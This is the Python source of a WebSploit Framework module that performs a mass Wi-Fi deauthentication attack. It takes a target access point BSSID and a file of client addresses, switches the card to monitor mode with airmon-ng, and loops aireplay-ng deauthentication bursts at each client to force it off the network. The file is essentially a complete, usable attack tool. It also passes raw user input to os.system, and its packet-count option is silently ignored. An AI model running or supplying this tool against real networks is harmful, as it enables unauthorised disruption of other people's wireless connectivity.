#!/usr/bin/env python
#
# WebSploit Framework Mass De-authentication module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com
import os
import subprocess
from time import sleep
from core import help
from core import wcolors

options = ["wlan0", "00:00:00:00:00:00", "/tmp/essid.txt", "5", "mon0"]
def mass_deauth():
	try:
		line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
		line_1+= ":"
		line_1+= wcolors.color.UNDERL + wcolors.color.BLUE + "Mass_Deauth" + wcolors.color.ENDC
		line_1+= " > "
		com = raw_input(line_1)
		com = com.lower()
		if com[0:13] == 'set interface':
			options[0] = com[14:20]
			print "INTERFACE => ", options[0]
			mass_deauth()
		elif com[0:9] == 'set bssid':
			options[1] = com[10:]
			print "BSSID => ", options[1]
			mass_deauth()
		elif com[0:14] == 'set essid_file':
			options[2] = com[14:]
			print "ESSID_FILE => ", options[2]
			mass_deauth()
		elif com[0:14] == 'set packet_len':
			options[3] = com[14:]
			print "PACKET_LEN => ", options[3]
			mass_deauth()
		elif com[0:7] == 'set mon':
			options[4] = com[8:12]
			print "MON => ", options[4]
			mass_deauth()
		elif com[0:2] =='os':
			os.system(com[3:])
			mass_deauth()
		elif com[0:4] =='help':
			help.help()
			mass_deauth()
		elif com[0:4] =='back':
			pass
		elif com[0:12] =='show options':
			print ""
			print "Options\t\t Value\t\t\t\t RQ\t Description"
			print "---------\t--------------\t\t\t----\t--------------"
			print "interface\t"+options[0]+"\t\t\t\tyes\tWireless Interface Name"
			print "bssid\t\t"+options[1]+"\t\tyes\tTarget Access Point BSSID"
			print "essid_file\t"+options[2]+"\t\t\tyes\tFile Contain Client ESSID"
			print "packet_len\t"+options[3]+"\t\t\t\tyes\tNumber of Packets"
			print "mon\t\t"+options[4]+"\t\t\t\tyes\tMonitor Mod(default)"
			print "\n"
			mass_deauth()
		elif com[0:3] =='run':
			print wcolors.color.GREEN + "[*] Loading %s"%options[2] + wcolors.color.ENDC
			try:
				f = open(options[2], "r").readlines()
			except Exception, e:
				print wcolors.color.RED + "Error : %s"%e + wcolors.color.ENDC
				mass_deauth()

			print wcolors.color.GREEN + "[*] Enabling Monitor Mod on %s"%options[0]
			try:
				monitor_mod = "airmon-ng start %s" % (options[0])
				subprocess.Popen(monitor_mod, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
			except Exception, e:
				print wcolors.color.RED + "Error : %s"%e + wcolors.color.ENDC
				mass_deauth()
			for essids in f:
				essids = essids.strip("\n")
				print wcolors.color.GREEN + "[*] Attempting to De-authentication %s"%essids + wcolors.color.ENDC
				command = "aireplay-ng -0 5 -a %s -c %s %s"%(options[1], essids, options[4])
				os.system(command)
			print wcolors.color.GREEN + "[*] Disabling Monitor Mod ..." + wcolors.color.ENDC
			disable_mon = "airmon-ng stop %s"%options[4]
			subprocess.Popen(disable_mon, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
			print wcolors.color.GREEN + "[*] Done."+ wcolors.color.ENDC
			mass_deauth()
		else:
			print "Wrong Command => ", com
			mass_deauth()
	except(KeyboardInterrupt):
		print(wcolors.color.RED + "\n[*] (Ctrl + C ) Detected, Module Exit" + wcolors.color.ENDC)